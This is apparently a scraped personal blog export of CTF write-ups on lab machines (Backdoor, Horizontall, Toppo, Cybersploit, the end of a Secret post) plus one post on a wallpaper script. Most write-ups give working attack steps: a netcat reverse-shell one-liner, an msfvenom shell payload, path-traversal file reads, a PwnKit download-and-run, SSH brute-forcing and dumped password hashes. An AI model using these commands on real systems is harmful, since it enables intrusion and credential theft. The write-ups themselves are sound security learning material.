&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;opt&#x2F;count &#x2F;snap&#x2F;snapd&#x2F;13640&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine &#x2F;snap&#x2F;snapd&#x2F;13170&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine --- [*] fst100 Useful binaries................................................. yes! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( network )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] net000 Services listening only on localhost............................ yes! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( software )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] sof170 Can we access MongoDB databases without credentials?............ yes! ps auxps aux |grep mongo ps aux |grep mongo mongodb 863 0.3 1.8 982012 75084 ? Ssl 19:18 0:06 &#x2F;usr&#x2F;bin&#x2F;mongod --unixSocketPrefix&#x3D;&#x2F;run&#x2F;mongodb --config &#x2F;etc&#x2F;mongodb.conf dasith 9570 0.0 0.0 6432 676 ? S 19:55 0:00 grep --color&#x3D;auto mongo MongoDBhttps://stackoverflow.com/questions/24985684/mongodb-show-all-contents-from-all-collections Nice and short doc, I like it. dasith@secret:~&#x2F;local-web$ mongo And list the db. show dbs admin 0.000GB auth-web 0.000GB config 0.000GB local 0.000GB let’s use auth-web. use auth-web And show the collections, is it la tables? show collections db.users.find() &#123; &quot;_id&quot; : ObjectId(&quot;6131bf09c6c27d0b05c16691&quot;), &quot;name&quot; : &quot;theadmin&quot;, &quot;email&quot; : &quot;admin@admins.com&quot;, &quot;password&quot; : &quot;$2a$10$SJ8vlQEJYL2J673Xte6BNeMmhHBioLSn6&#x2F;wqMz2DKjxwQzkModUei&quot;, &quot;date&quot; : ISODate(&quot;2021-09-03T06:22:01.581Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;6131bfb7c6c27d0b05c16699&quot;), &quot;name&quot; : &quot;user222&quot;, &quot;email&quot; : &quot;user@google.com&quot;, &quot;password&quot; : &quot;$2a$10$WmuQwihUQkzSrRoYakQdI.5hdjo820LNxSfEYATaBoTa&#x2F;QXJmEbDS&quot;, &quot;date&quot; : ISODate(&quot;2021-09-03T06:24:55.832Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;6131d73387dee30378c66556&quot;), &quot;name&quot; : &quot;newuser&quot;, &quot;email&quot; : &quot;root@dasith.works&quot;, &quot;password&quot; : &quot;$2a$10$wnvh2al2ABafCszb9oWi&#x2F;.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW&quot;, &quot;date&quot; : ISODate(&quot;2021-09-03T08:05:07.991Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;613904ae8a27cb040c65de17&quot;), &quot;name&quot; : &quot;dasith&quot;, &quot;email&quot; : &quot;dasiths2v2@gmail.com&quot;, &quot;password&quot; : &quot;$2a$10$S&#x2F;GbYplKgIU4oFdTDsr2SeOJreht3UgIA0MdT7F50EtiBy7ymzFBO&quot;, &quot;date&quot; : ISODate(&quot;2021-09-08T18:45:02.187Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;61faddebceb4af047698ceff&quot;), &quot;name&quot; : &quot;johnjohn&quot;, &quot;email&quot; : &quot;2d5b68c8@hax.com&quot;, &quot;password&quot; : &quot;$2a$10$u840Z7TxjF0lVjNmkYNQtOfTuQSBfV32i44FZaQ3Cnw3XcxlO5zSe&quot;, &quot;date&quot; : ISODate(&quot;2022-02-02T19:39:23.759Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;61fae16eceb4af047698cf13&quot;), &quot;name&quot; : &quot;carambar&quot;, &quot;email&quot; : &quot;fb07a043@hax.com&quot;, &quot;password&quot; : &quot;$2a$10$4TevfjCfQqSxJhai7njib.&#x2F;hhadYUP7QHbwOEQXJr4O8AW3kWLTc.&quot;, &quot;date&quot; : ISODate(&quot;2022-02-02T19:54:22.118Z&quot;), &quot;__v&quot; : 0 &#125; &#123; &quot;_id&quot; : ObjectId(&quot;61fae1eeceb4af047698cf18&quot;), &quot;name&quot; : &quot;carambarcefef&quot;, &quot;email&quot; : &quot;e78ece86@hax.com&quot;, &quot;password&quot; : &quot;$2a$10$JSZCh0l9KK1m1fyxfsEFR.sN8adWvt5r.0QHHE52yVdbIceEgGLMy&quot;, &quot;date&quot; : ISODate(&quot;2022-02-02T19:56:30.893Z&quot;), &quot;__v&quot; : 0 &#125; Whruyyyyy!!!!!! Decrypt the passwordroot@dasith.works this use is cool. $2a$10$wnvh2al2ABafCszb9oWi&#x2F;.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW I can’t do it, it’s too hard. /opt/countI saw this program with the lse script.When you run it he ask a file to read and tell you this: I’m trying to read the root flag.The program can read it. HintI got the flag from a coredump file.Someone forgot to remove it.So I have to kill count. Spawn 2 shellOne shell with the /opt/countOne shelll to kill it In /var/crash we have this file: _opt_count.1000.crash apport-unpackhttps://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash apport-unpack _opt_count.1000.crash &#x2F;tmp&#x2F;wruyyyyy &#96;&#96;&#96;&#96; And then: &#96;&#96;&#96;sh strings &#x2F;tmp&#x2F;wr*&#x2F;Cor* It’s over, it’s faster with polkit exploit. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"api","slug":"api","permalink":"https://peanutstick.github.io/tags/api/"}]},{"title":"CTF Backdoor","slug":"CTF Backdoor","date":"2022-01-30T04:19:00.000Z","updated":"2023-04-12T14:14:27.257Z","comments":true,"path":"/post/CTF Backdoor.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Backdoor.html","excerpt":"","text":"hostssudo echo &quot;10.10.11.125 backdoor.htb&quot; &gt;&gt; &#x2F;etc&#x2F;hosts nmapnmap -A -p- 10.10.11.125 PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA) | 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA) |_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519) 80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache&#x2F;2.4.41 (Ubuntu) |_http-generator: WordPress 5.8.1 |_http-title: Backdoor &amp;#8211; Real-Life Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel It’s a wordpress website. wpscanwpscan --url http:&#x2F;&#x2F;backdoor.htb&#x2F; User wbhttp:&#x2F;&#x2F;backdoor.htb&#x2F;?author&#x3D;1 CVE-2016-10924??? pochttps://www.exploit-db.com/exploits/39575 wp-confighttp://10.10.11.125:80/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php Mysql passdefine( ‘DB_PASSWORD’, ‘MQYBJSaD#DxG6qbm’ ); /etc/passwdcurl http:&#x2F;&#x2F;backdoor.htb&#x2F;wp-content&#x2F;plugins&#x2F;ebook-download&#x2F;filedownload.php\\?ebookdownloadurl&#x3D;&#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;passwd&#x2F;etc&#x2F;passwdroot:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin _apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin sshd:x:112:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin user:x:1000:1000:user:&#x2F;home&#x2F;user:&#x2F;bin&#x2F;bash lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false mysql:x:113:118:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false &lt;script&gt;window.close()&lt;&#x2F;script&gt;% Directory traversall bloghttps://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/ This one gonna help me to exploit the machine.There is 3 exemples, this one sound good./proc/[PID]/cmdline http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl=/proc/1/cmdline I don’t know how to use burpsuite, I’m gonna create a script. i=1 while ((i&lt;1000)) do echo $i curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\\?ebookdownloadurl=/proc/$i/cmdline >> pid.txt ((i=i+1)) done I forgot it put the \\n for each lines but it works. gdbserver Ahaha I just need a sheel and I’m root. exploit gdb serverhttps://www.exploit-db.com/exploits/50539 help &#x3D; f&#39;&#39;&#39; Usage: python3 &#123;sys.argv[0]&#125; &lt;gdbserver-ip:port&gt; &lt;path-to-shellcode&gt; Example: - Victim&#39;s gdbserver -&gt; 10.10.10.200:1337 - Attacker&#39;s listener -&gt; 10.10.10.100:4444 1. Generate shellcode with msfvenom: $ msfvenom -p linux&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;10.10.10.100 LPORT&#x3D;4444 PrependFork&#x3D;true -o rev.bin 2. Listen with Netcat: $ nc -nlvp 4444 3. Run the exploit: $ python3 &#123;sys.argv[0]&#125; 10.10.10.200:1337 rev.bin &#39;&#39;&#39; This is what you have to do.It was hard to connect to the server, I had lot of errors.I was drooling on my keyboard while i thought about what i could do next. And I’m in. Exploit pwnkitThis exploit is so good.We don’t have gcc on the target machine so I’m gonna use python. Download thee exploit on my computermkdir exp cd exp wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;joeammond&#x2F;CVE-2021-4034&#x2F;main&#x2F;CVE-2021-4034.py python2.7 -m SimpleHTTPServer Download on the target from my computerwget 10.10.14.119:8000&#x2F;CVE-2021-4034.py eploitpython3 CVE-2021-4034.py id ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Horizontall","slug":"CTF Horizontall","date":"2022-01-24T02:42:00.000Z","updated":"2023-04-12T14:14:27.261Z","comments":true,"path":"/post/CTF Horizontall.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Horizontall.html","excerpt":"","text":"DescriptionHorizontal from HTB. nmapnmap -sV -p- 10.10.11.105 22&#x2F;tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http nginx 1.14.0 (Ubuntu) Port 80It’s forbiden, I have to add the dns: &#x2F;etc&#x2F;hosts 10.10.11.105 horizontall.htb JavascriptThe file /js/app.c68eb462.js is obfuscated I have to use a tool to read it.https://lelinhtinh.github.io/de4js/I found the link http://api-prod.horizontall.htb/reviewsI have to add it to my /etc/hosts file. gobustergobuster dir -u http:&#x2F;&#x2F;api-prod.horizontall.htb&#x2F; -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-small.txt -t 150 --wildcard switch | grep &quot;(Status:&quot; &#x2F;admin (Status: 200) [Size: 854] &#x2F;users (Status: 403) [Size: 60] &#x2F;reviews (Status: 200) [Size: 507] &#x2F;Reviews (Status: 200) [Size: 507] &#x2F;Users (Status: 403) [Size: 60] &#x2F;Admin (Status: 200) [Size: 854] &#x2F;REVIEWS (Status: 200) [Size: 507] In admin we have the login page to strapiIn reviews we have a json file. exploit strapihttps://www.exploit-db.com/exploits/50239 python3 50239.py http:&#x2F;&#x2F;api-prod.horizontall.htb The shell is broken but we have the creds. [+] Password reset was successfully [+] Your email is: admin@horizontall.htb [+] Your new credentials are: admin:SuperStrongPassword1 One week later… Ok, the credentials are useless, I have to use the blind RCE, On my computer: nc -nlvp 4242 Blind RCE: rm &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.214 4242 &gt;&#x2F;tmp&#x2F;f And I’m in. Strapi shellIn /home/developer/user.txt:e6cb8f6f0831dc40507c330d548ea384 exploitUploadLook at this boy, it’s so cool dragon * MakeThis is a new exploit, released 2 days ago.https://github.com/berdav/CVE-2021-4034 I’m using dragon to drag and drop my files. cat &#x2F;root&#x2F;root.txt 373da3c143300dec7f9357b24c8b202a I really feel like a god xD Every computer are vulnerable, you have to update your system, When I’v started the box the exploit was not availible. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Toppo","slug":"CTF Toppo","date":"2022-01-22T23:54:00.000Z","updated":"2023-04-12T14:14:27.267Z","comments":true,"path":"/post/CTF Toppo.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Toppo.html","excerpt":"","text":"CTF ToppoCTF Linux Created At : 2022-01-22 17:54 Count:663 Views 👀 :2174 DescriptionThe Machine isn&#39;t hard to own and don&#39;t require advanced exploitation . Level : Beginner DHCP : activated Inside the zip you will find a vmdk file , and I think you will be able to use it with any usual virtualization software ( tested with Virtualbox) . If you have any question : my twitter is @h4d3sw0rm Happy Hacking ! Netdiscover 192.168.0.43 nmap➜ ~ nmap -sV -p- 192.168.0.43 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-01-22 10:58 CET Nmap scan report for 192.168.0.43 Host is up (0.011s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.4.10 ((Debian)) 111&#x2F;tcp open rpcbind 2-4 (RPC #100000) 56317&#x2F;tcp open status 1 (RPC #100024) Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; . Nmap done: 1 IP address (1 host up) scanned in 17.26 seconds 22, 80, 111, 56317 Port 80Nikto+ OSVDB-3268: &#x2F;admin&#x2F;: Directory indexing found. + OSVDB-3092: &#x2F;admin&#x2F;: This might be interesting... + OSVDB-3268: &#x2F;img&#x2F;: Directory indexing found. + OSVDB-3092: &#x2F;img&#x2F;: This might be interesting... + OSVDB-3268: &#x2F;mail&#x2F;: Directory indexing found. + OSVDB-3092: &#x2F;mail&#x2F;: This might be interesting... + OSVDB-3092: &#x2F;manual&#x2F;: Web server manual found. + OSVDB-3268: &#x2F;manual&#x2F;images&#x2F;: Directory indexing found. In the admin directory we have one file, notes.txt: Note to myself : I need to change my password :&#x2F; 12345ted123 is too outdated but the technology isn&#39;t my thing i prefer go fishing or watching soccer . Password: 12345ted123 Port 22ssh with the password ssh ted@192.168.0.43. ssh ted@192.168.0.43 I’m in lse.shwget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;diego-treitos&#x2F;linux-smart-enumeration&#x2F;master&#x2F;lse.sh chmod +x lse.sh .&#x2F;lse.sh And this is what I found interesting: Hostname: Toppo Linux: 3.16.0-4-586 Distribution: Debian GNU&#x2F;Linux 8.10 (jessie) Architecture: i686 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] fst000 Writable files outside user&#39;s home.............................. yes! [*] fst010 Binaries with setuid bit........................................ yes! [!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;usr&#x2F;bin&#x2F;python2.7 &#x2F;usr&#x2F;bin&#x2F;mawk --- [!] fst030 Can we write to any setuid binary?.............................. yes! --- &#x2F;usr&#x2F;bin&#x2F;python2.7 --- That’s all. Let’s see what we can do with python. gtfobinhttps://gtfobins.github.io/gtfobins/python/ ted@Toppo:&#x2F;home$ python Python 2.7.9 (default, Aug 13 2016, 16:41:35) [GCC 4.9.2] on linux2 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; import os; os.system(&quot;&#x2F;bin&#x2F;sh&quot;) # id uid&#x3D;1000(ted) gid&#x3D;1000(ted) euid&#x3D;0(root) groups&#x3D;1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth) # whoami root flag.txt cat &#x2F;root&#x2F;flag.txt _________ | _ _ | |_&#x2F; | | \\_|.--. _ .--. _ .--. .--. | | &#x2F; .&#39;&#96;\\ \\[ &#39;&#x2F;&#39;&#96;\\ \\[ &#39;&#x2F;&#39;&#96;\\ \\&#x2F; .&#39;&#96;\\ \\ _| |_ | \\__. | | \\__&#x2F; | | \\__&#x2F; || \\__. | |_____| &#39;.__.&#39; | ;.__&#x2F; | ;.__&#x2F; &#39;.__.&#39; [__| [__| Congratulations ! there is your flag : 0wnedlab&#123;p4ssi0n_c0me_with_pract1ce&#125; ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"Wallpaper selector with sxiv","slug":"Wallpaper selector with sxiv","date":"2022-01-22T08:35:00.000Z","updated":"2023-04-12T14:14:27.277Z","comments":true,"path":"/post/Wallpaper selector with sxiv.html","link":"","permalink":"https://peanutstick.github.io/post/Wallpaper%20selector%20with%20sxiv.html","excerpt":"","text":"What it doesIt will change my walpaper and colors of my polybar theme and firefox. What do I usenitrogen for the wallpaper,pywal for my color scheme,pywal for for the colors of firefox. WalpI have a script to change everything but without sxiv.You have to copy this code somewhere in your path, mine is in /usr/local/bin/walp.You can type echo $PATH to see more options. ➜ ~ cat $(where walp) nitrogen --set-scaled &quot;$1&quot; wal -i &quot;$1&quot; pywalfox update sxivYou can type this command to see the images in your current folder. sxiv -t -a * I’m gonna use this one to select my future walpaper. walp $(sxiv -t -a -o ~&#x2F;Pictures&#x2F;*) You have to select the walpaper with the key m and press q to leave.It’s working well but I was to start it via dmenu because I’m too lazy to type the command. dmenuI like the command walp, I will modify it. if [ -z $1]; then walp $(sxiv -t -a -o ~&#x2F;Pictures&#x2F;*) fi nitrogen --set-scaled &quot;$1&quot; wal -i &quot;$1&quot; pywalfox update ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Rice","slug":"Rice","permalink":"https://peanutstick.github.io/tags/Rice/"}]},{"title":"CTF cybersploit","slug":"CTF cybersploit","date":"2022-01-22T02:19:00.000Z","updated":"2023-04-12T14:14:27.261Z","comments":true,"path":"/post/CTF cybersploit.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20cybersploit.html","excerpt":"","text":"DescriptionTHIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM.FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER &amp; EXPLOIT-DB. netdiscover 192.168.0.42 nmapnmap -sV -p- 192.168.0.42 22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) 80&#x2F;tcp open http Apache httpd 2.2.22 ((Ubuntu)) port 80 robots.txtR29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 I think it’s base64. ➜ ~ echo R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9 | base64 --decode Good Work ! Flag1: cybersploit&#123;youtube.com&#x2F;c&#x2F;cybersploit&#125;% Source code &lt;!-------------username:itsskv---------------------&gt; GifIn the gif we have this code.I don’t know what to do with it.It’s not in hexadecimal because there is a P and S. B2C B2B PSD RGB Port 22I did a wordlist with the words in the gif and the website.https://weakpass.com/generateSeriously: And th password was the flag. hydra -l itsskv -P cyberwordlist -s 22 -f 192.168.0.42 ssh [22][ssh] host: 192.168.0.42 login: itsskv password: cybersploit&#123;youtube.com&#x2F;c&#x2F;cybersploit&#125; flag2.txtitsskv@cybersploit-CTF:~$ ls Desktop Downloads flag2.txt Pictures Templates Documents examples.desktop Music Public Videos itsskv@cybersploit-CTF:~$ cat flag2.txt 01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101 good work ! flag2: cybersploit&#123;https:t.me&#x2F;cybersploit1&#125; LSE.sh Hostname: cybersploit-CTF Linux: 3.13.0-32-generic Distribution: Ubuntu 12.04.5 LTS Architecture: i686 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [!] fst020 Uncommon setuid binaries........................................ yes! --- &#x2F;usr&#x2F;bin&#x2F;X &#x2F;usr&#x2F;bin&#x2F;lppasswd --- [*] fst080 Can we read subdirectories under &#x2F;home?......................... yes! [*] fst100 Useful binaries................................................. yes! I have one thing interestion, the ubuntu version. Exploithttps://www.exploit-db.com/exploits/37292I can’t download andd vi crash when I use it, that’s why I use nano. itsskv@cybersploit-CTF:~$ touch exp.c itsskv@cybersploit-CTF:~$ itsskv@cybersploit-CTF:~$ nano exp.c itsskv@cybersploit-CTF:~$ gcc exp.c -o exp itsskv@cybersploit-CTF:~$ ./exp spawning threads mount #1 mount #2 child threads done /etc/ld.so.preload created creating shared library # id uid=0(root) gid=0(root) groups=0(root),1001(itsskv) finalflag.txtroot@cybersploit-CTF:&#x2F;home&#x2F;itsskv# cat &#x2F;root&#x2F;finalflag.txt ______ ____ ____ .______ _______ .______ _______..______ __ ______ __ .___________. &#x2F; |\\ \\ &#x2F; &#x2F; | _ \\ | ____|| _ \\ &#x2F; || _ \\ | | &#x2F; __ \\ | | | | | ,----&#39; \\ \\&#x2F; &#x2F; | |_) | | |__ | |_) | | (----&#96;| |_) | | | | | | | | | &#96;---| |----&#96; | | \\_ _&#x2F; | _ &lt; | __| | &#x2F; \\ \\ | ___&#x2F; | | | | | | | | | | | &#96;----. | | | |_) | | |____ | |\\ \\----.----) | | | | &#96;----.| &#96;--&#39; | | | | | \\______| |__| |______&#x2F; |_______|| _| &#96;._____|_______&#x2F; | _| |_______| \\______&#x2F; |__| |__| _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 